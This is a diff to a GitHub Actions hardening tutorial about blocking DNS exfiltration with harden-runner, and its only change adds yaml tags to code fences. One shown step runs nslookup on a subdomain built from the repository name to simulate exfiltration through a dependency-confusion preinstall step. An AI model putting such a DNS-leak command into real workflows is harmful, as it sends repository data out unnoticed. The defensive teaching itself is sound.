@@ -30,13 +30,13 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
 
 3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `ci.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step from `line 9` onwards in the `ci.yml` file. Commit the changes either to `main` branch or any other branch.  
 
-    ```
+    ```yaml
     - uses: step-security/harden-runner@v1
       with:
         egress-policy: audit
     ```
     The updated file should look like this:
-    ```
+    ```yaml
     name: Test and coverage
 
     on: [push, pull_request, workflow_dispatch]
@@ -73,7 +73,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
 
 7. Update the `ci.yml` workflow with the recommended policy from the link. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 
 
-    ```
+    ```yaml
     - uses: step-security/harden-runner@v1
       with:
         allowed-endpoints: 
@@ -81,7 +81,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
           github.com:443
     ```
     The updated file should look like this:
-    ```
+    ```yaml
     name: Test and coverage
 
     on: [push, pull_request, workflow_dispatch]
@@ -111,7 +111,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
 
 8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 
 
-    ```
+    ```yaml
     - name: Simulate DNS traffic
         run: |
           domain="${GITHUB_REPOSITORY}.stepsecurity.io"
@@ -119,7 +119,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
           nslookup "${domain}"
     ```
     The updated file should look like this:
-    ```
+    ```yaml
     name: Test and coverage
 
     on: [push, pull_request, workflow_dispatch]
